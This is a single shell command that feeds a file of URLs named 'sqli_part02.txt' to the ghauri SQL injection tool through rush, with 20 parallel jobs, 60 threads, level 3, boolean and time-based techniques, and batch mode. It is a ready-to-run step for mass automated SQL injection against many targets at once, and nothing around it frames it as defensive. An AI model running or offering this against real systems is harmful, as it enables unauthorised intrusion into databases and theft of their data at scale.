cat sqli_part02.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --dbms --timeout 10 --threads 60 --level 3 --technique BT --batch"'
